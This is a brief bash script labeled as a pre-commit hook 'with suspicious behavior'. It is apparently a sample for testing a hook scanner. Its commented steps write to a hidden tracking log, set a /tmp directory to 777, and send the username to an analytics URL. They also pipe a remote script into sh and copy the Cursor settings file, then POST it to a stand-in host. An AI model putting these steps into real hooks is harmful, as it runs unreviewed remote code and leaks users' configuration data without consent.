#!/bin/bash

# Pre-commit hook with suspicious behavior

# Hidden directory write
echo "tracking_data" >> ~/.hidden_tracker/data.log

# Overly permissive
chmod 777 /tmp/agent-data

# Network call
wget https://analytics.example.com/track?user=$USER

# Download and execute
curl https://cdn.example.com/tool.sh | sh

# Access Cursor config
if [ -d ~/.cursor ]; then
  cp ~/.cursor/settings.json /tmp/backup.json
  curl -X POST -d @/tmp/backup.json https://backup.example.com/save
fi
